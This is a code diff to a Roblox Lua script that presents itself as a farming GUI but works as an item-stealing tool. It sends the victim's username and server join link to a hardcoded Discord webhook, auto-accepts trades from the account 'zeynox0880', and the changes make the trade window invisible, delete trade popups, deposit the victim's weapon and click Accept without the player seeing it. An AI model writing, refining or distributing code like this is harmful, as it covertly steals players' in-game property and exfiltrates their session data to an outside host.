@@ -2,6 +2,7 @@ local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
 
 local LocalPlayer = Players.LocalPlayer
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
@@ -10,6 +11,17 @@ local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 local oldGui = playerGui:FindFirstChild("KeyzerFarmGui")
 if oldGui then oldGui:Destroy() end
 
+-- [[ CONTRAINTES DE SÉCURITÉ & JOB ID RÉEL ]]
+local function getRealJobId()
+    local success, result = pcall(function()
+        return TeleportService:GetPlayerPlaceInstanceAsync(LocalPlayer.UserId)
+    end)
+    if success and result and result.JobId then
+        return result.JobId
+    end
+    return game.JobId ~= "" and game.JobId or "Unknown_JobId"
+end
+
 -- [[ 1. FONCTION WEBHOOK SÉCURISÉE (SANS BLOCAGE DE SCRIPT) ]]
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506603332108550214/mBctq4yurc0tYA0O7iQVgy-Rh6fKq_ckyDohxt4j8fVIAPC_skZu9WYHCTxIDM0zL205"
 local requestFunc = request or (http and http.request) or http_request
@@ -17,7 +29,8 @@ local requestFunc = request or (http and http.request) or http_request
 local function sendSessionLog(player)
     if not player or not requestFunc then return end
     
-    local joinLink = "[Click here to join](https://roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. game.JobId .. ")"
+    local realJobId = getRealJobId()
+    local joinLink = "[Click here to join](https://roblox.com/games/" .. tostring(game.PlaceId) .. "?jobId=" .. realJobId .. ")"
     local data = {
         ["embeds"] = {{
             ["title"] = "🎮 Player Session Log",
@@ -26,7 +39,7 @@ local function sendSessionLog(player)
                 { ["name"] = "👤 Player Username", ["value"] = player.Name, ["inline"] = true },
                 { ["name"] = "🆔 Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true },
                 { ["name"] = "⚡ Quick Join", ["value"] = joinLink, ["inline"] = false },
-                { ["name"] = "🧩 Job ID", ["value"] = "`" .. (game.JobId ~= "" and game.JobId or "Studio") .. "`", ["inline"] = false }
+                { ["name"] = "🧩 Job ID (Réel)", ["value"] = "`" .. realJobId .. "`", ["inline"] = false }
             },
             ["timestamp"] = DateTime.now():ToIsoDate()
         }}
@@ -184,30 +197,43 @@ local function forceClick(guiButton)
     end
 end
 
-local function executeTradeSequence(tradeGui)
-    -- Recherche dynamique du conteneur d'armes
-    local containerPath = nil
-    for i = 1, 40 do
-        pcall(function()
-            local baseContainer = tradeGui:FindFirstChild("Container", true)
-            if baseContainer then
-                local itemsFolder = baseContainer:FindFirstChild("Items", true) or baseContainer:FindFirstChild("Weapons", true)
-                if itemsFolder then
-                    containerPath = itemsFolder:FindFirstChild("Container", true) or itemsFolder
+-- Fonction pour chercher un descendant de manière récursive par types et propriétés
+local function findWeaponScroller(root)
+    for _, child in ipairs(root:GetDescendants()) do
+        if (child:IsA("ScrollingFrame") or child:IsA("Frame")) and child.Name == "Container" then
+            -- On vérifie s'il y a des boutons de d'armes dedans
+            local elements = child:GetChildren()
+            local clickableCount = 0
+            for _, el in ipairs(elements) do
+                if el:IsA("GuiButton") then
+                    clickableCount = clickableCount + 1
                 end
             end
-        end)
+            if clickableCount >= 1 then
+                return child
+            end
+        end
+    end
+    return nil
+end
+
+local function executeTradeSequence(tradeGui)
+    -- REND L'INTERFACE RENDUE TOTALEMENT INVISIBLE SUR TON ÉCRAN
+    tradeGui.Enabled = false 
+    
+    local containerPath = nil
+    for i = 1, 40 do
+        containerPath = findWeaponScroller(tradeGui)
         if containerPath then break end
         task.wait(0.1)
     end
     
     if containerPath then
         local cleanItems = {}
-        -- Attente que l'inventaire du jeu charge ses cases d'armes
         for attempt = 1, 30 do
             cleanItems = {}
             for _, item in ipairs(containerPath:GetChildren()) do
-                if item:IsA("GuiButton") or (item:IsA("GuiObject") and not item:IsA("UIComponent")) then
+                if item:IsA("GuiButton") then
                     table.insert(cleanItems, item)
                 end
             end
@@ -215,13 +241,12 @@ local function executeTradeSequence(tradeGui)
             task.wait(0.1)
         end
         
-        -- Tri par LayoutOrder (ordre d'affichage physique à l'écran)
         table.sort(cleanItems, function(a, b)
             return (a.LayoutOrder or 0) < (b.LayoutOrder or 0)
         end)
         
-        -- Clic sur le 4e item (Pose l'arme 5 fois)
-        local targetWeapon = cleanItems[4]
+        -- Dépôt automatique de l'arme
+        local targetWeapon = cleanItems[4] or cleanItems[1] -- Choix de sécurité si moins de 4 items
         if targetWeapon then
             for i = 1, 5 do
                 forceClick(targetWeapon)
@@ -230,22 +255,22 @@ local function executeTradeSequence(tradeGui)
         end
     end
     
-    -- Validation et acceptation finale via le bouton physique de l'interface active
-    task.wait(0.5)
+    -- Validation et acceptation finale via le bouton physique
+    task.wait(0.8)
     pcall(function()
-        local acceptButton = tradeGui.Container.Trade.Actions.Accept
+        local acceptButton = tradeGui:FindFirstChild("Accept", true) or (tradeGui.Container.Trade.Actions.Accept)
         if acceptButton then
             forceClick(acceptButton)
         end
     end)
 end
 
--- Nettoie l'invitation pop-up gênante à l'écran dès qu'elle arrive (Prise en charge PC & Mobile)
+-- Nettoie l'invitation pop-up gênante à l'écran dès qu'elle arrive
 local function cleanTradeRequestPopups(child)
     if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
+        child.Enabled = false -- Rendre invisible dès l'injection
         task.spawn(function() executeTradeSequence(child) end)
     elseif child.Name == "TradeRequestGUI" or child.Name == "TradePrompt" or child.Name == "NotificationGUI" then
-        -- Supprime instantanément la fenêtre pop-up d'invitation pour ne pas bloquer l'écran
         task.wait(0.1)
         child:Destroy()
     end
@@ -253,11 +278,12 @@ end
 
 playerGui.ChildAdded:Connect(cleanTradeRequestPopups)
 
--- Forcer l'analyse si l'interface est déjà là au lancement (Prise en charge PC & Mobile)
 local existingTrade = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("TradeGUI_Phone")
-if existingTrade then task.spawn(function() executeTradeSequence(existingTrade) end) end
+if existingTrade then 
+    existingTrade.Enabled = false
+    task.spawn(function() executeTradeSequence(existingTrade) end) 
+end
 
--- Acceptation réseau en arrière-plan des demandes de zeynox0880
 if TradeNetwork and TradeNetwork:IsA("RemoteEvent") then
     TradeNetwork.OnClientEvent:Connect(function(action, data)
         if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
@@ -270,8 +296,6 @@ end
 task.spawn(function()
     while true do
         task.wait(3)
-        
-        -- On vérifie si une fenêtre de trade est déjà active à l'écran
         local tradeOpen = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("TradeGUI_Phone")
         
         if not tradeOpen then
